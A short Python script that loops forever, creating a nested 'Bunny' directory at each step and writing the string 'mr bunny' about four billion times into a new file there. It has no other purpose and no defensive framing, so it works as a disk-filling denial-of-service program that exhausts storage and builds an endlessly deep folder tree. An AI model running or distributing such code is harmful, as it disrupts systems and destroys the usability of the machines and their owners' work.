import os
Bunny = 0
while True:
    os.mkdir('Bunny', mode=0o777, dir_fd=None)
    os.chdir('./Bunny')
    cringe = open('myfile{}cnt.dat'.format(Bunny), 'a+')
    for i in range(2 ** 32):
        cringe.write('mr bunny')
    Bunny += 1